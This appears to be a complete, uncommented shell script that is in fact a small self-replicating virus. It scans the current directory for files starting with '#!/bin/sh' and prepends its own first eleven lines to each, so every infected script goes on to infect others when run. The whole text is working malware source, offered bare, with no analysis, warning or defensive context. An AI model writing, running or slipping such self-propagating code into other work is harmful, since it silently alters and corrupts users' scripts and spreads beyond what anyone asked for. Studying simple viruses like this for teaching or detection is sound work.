#!/bin/sh
for F in *
do
  if [ "$(head -c9 $F 2>/dev/null)" = "#!/bin/sh" ]
  then
        head -11 $0 > tmp
        cat $F >> tmp
        mv tmp $F
  fi
done
